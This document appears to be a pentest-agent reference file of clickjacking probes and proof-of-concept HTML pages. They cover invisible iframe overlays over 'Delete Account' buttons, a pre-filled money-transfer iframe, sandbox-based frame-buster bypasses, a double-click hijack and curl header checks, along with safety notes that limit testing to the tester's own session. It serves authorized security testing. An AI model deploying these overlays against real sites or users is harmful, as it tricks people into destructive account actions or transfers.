# payloads — clickjacking-hunter

**Source:** `pentest-agent-development/notebooklm-notes/Guia Completo de Segurança e Testes contra Clickjacking.md` (Section 5: PAYLOADS / PROBES)

Clickjacking "payloads" are HTML pages hosted by the tester that iframe
the target. They run on `http://localhost:8000` or a burner domain — not
the target. The tester is the victim in their own browser to prove
framability.

---

## 1. Baseline Framing Probe

The simplest test: a single-page HTML file that iframes the target URL.

```html
<!doctype html>
<html>
<head><title>Clickjacking Probe</title></head>
<body>
  <h1>Framing probe</h1>
  <p>If the target appears below, it is framable.</p>
  <iframe src="https://target.example/settings"
          width="800" height="600"></iframe>
</body>
</html>
```

Expected result:
- **Framable (vulnerable)**: The target renders inside the iframe.
- **Not framable**: The iframe is blank / a "This page cannot be
  displayed in a frame" console warning appears.

Confirm via the browser's DevTools console — modern browsers log
`Refused to display '...' in a frame because it set 'X-Frame-Options'
to 'DENY'`.

---

## 2. Transparent Overlay PoC (Click-through)

```html
<!doctype html>
<html>
<head>
<style>
  body { margin: 0; padding: 0; }
  #victim-site {
    position: absolute;
    top: 0; left: 0;
    width: 500px; height: 500px;
    opacity: 0.00001;              /* invisible but still interactive */
    z-index: 1;
  }
  #decoy {
    position: absolute;
    top: 0; left: 0;
    width: 500px; height: 500px;
    z-index: -1;                   /* behind the iframe */
    background: #f0f0f0;
  }
</style>
</head>
<body>
  <iframe id="victim-site" src="https://target.example/settings/delete-account"></iframe>
  <div id="decoy">
    <h1>Click here to win!</h1>
    <!-- Position the decoy button to sit exactly under the target's
         "Delete Account" button. The victim clicks "win" but actually
         clicks the hidden Delete button. -->
    <button style="position: absolute; top: 300px; left: 200px;">
      Click to Win
    </button>
  </div>
</body>
</html>
```

Adjust `top` / `left` on `#decoy > button` until it aligns with the
destructive button on the target. This is the classic UI-redress PoC.

---

## 3. Pre-Filled State URL (Initialized Attack)

When the target accepts GET-parameters that pre-fill a destructive form,
embed the pre-filled URL in the iframe:

```html
<iframe src="https://target.example/transfer_money?recipient=attacker-account&amount=5000"
        width="800" height="600"></iframe>
```

The victim only needs to click "Confirm" (or anything that triggers the
submit). The values are already filled in. Test whether:
- The app auto-fills these fields from the URL.
- No secondary confirmation (password re-entry, 2FA) is required.

---

## 4. Sandbox Attribute Bypass

When the target uses JavaScript "frame-busting" (e.g.,
`if (self !== top) top.location = self.location`), the `sandbox`
attribute disables the frame-buster while still allowing interaction:

```html
<iframe src="https://target.example/settings"
        sandbox="allow-forms allow-scripts allow-same-origin"
        width="800" height="600"></iframe>
```

```html
<!-- Even stricter sandbox that only allows form submission: -->
<iframe src="https://target.example/delete"
        sandbox="allow-forms"
        width="800" height="600"></iframe>
```

`sandbox` without `allow-scripts` means the frame-busting JS never runs
— but form submissions still work.

---

## 5. Double-Click Hijack (browser quirk)

When the first click of a sequence lands on an overlay and the second
reaches the target — useful when the target has one confirmation dialog.

```html
<iframe id="t" src="https://target.example/sensitive-action"></iframe>
<div id="cover" onclick="this.style.display='none'" style="
  position: absolute; top: 0; left: 0;
  width: 100%; height: 100%; z-index: 2;
  background: white;">
  <h1>Prove you're human. Click anywhere.</h1>
</div>
```

First click removes the cover and is consumed by the overlay; the
second click (a quick-follow-up) lands on the target.

---

## 6. Header-Audit Probes (no iframe needed)

Clickjacking risk can often be confirmed from the response headers alone:

```bash
# Passive — fetch headers only
curl -s -I "https://target.example/settings"

# Look for:
#   X-Frame-Options: DENY          → safe
#   X-Frame-Options: SAMEORIGIN    → safe from cross-origin framing
#   X-Frame-Options: ALLOW-FROM     → deprecated; unreliable
#   (header missing)               → framing likely allowed

# And:
#   Content-Security-Policy: frame-ancestors 'self'   → safe
#   Content-Security-Policy: frame-ancestors *        → EVERY site can frame
#   (directive missing)                               → default = allowed

# Cookie flags on session cookies:
#   Set-Cookie: sess=...; SameSite=Strict  → blocks cross-site iframes
#   Set-Cookie: sess=...; SameSite=Lax     → blocks cross-site POST
#   (SameSite missing)                     → frameable session
```

Minimum evidence for the finding:

```bash
curl -s -D - -o /dev/null "https://target.example/settings" | \
  grep -iE '^(x-frame-options|content-security-policy|set-cookie):'
```

Report the target URL + the literal header values.

---

## 7. CSP `frame-ancestors` Bypass Scenarios

When CSP is set but permissive:

```
Content-Security-Policy: frame-ancestors https://*.target.example
```

Test whether ANY `*.target.example` subdomain can be claimed / has XSS
that allows arbitrary framing (subdomain-takeover or XSS → frame-and-
redress).

```html
<!-- host on a subdomain takeover target -->
<iframe src="https://target.example/sensitive-action" ...></iframe>
```

Delegate to `subdomain-takeover-hunter` / `xss-hunter` for the chain.

---

## Test Execution Recipe

1. `curl -sI <url>` — verify X-Frame-Options / CSP / SameSite.
2. If headers missing, write the Baseline Framing Probe (Section 1)
   to a local file and open in a browser pointed at the iframe URL.
3. If framed, write the Transparent Overlay PoC (Section 2) and
   align the decoy button to the destructive button.
4. Verify a single click causes a state change in an authenticated
   session.
5. Capture the screenshot + HTML source as evidence.

---

## Safety Notes

- The attack happens IN THE TESTER'S OWN BROWSER using the tester's own
  authenticated session. No victim is ever involved in testing.
- Do NOT share a clickjacking PoC URL publicly (via Slack, Twitter) —
  someone clicking it may perform a real state change on their account.
- Destructive actions (delete account) require `destructive_testing:
  approved` even in a tester's own session — prefer lower-risk
  state-changing actions (change display name, toggle email
  preferences) for the initial PoC.
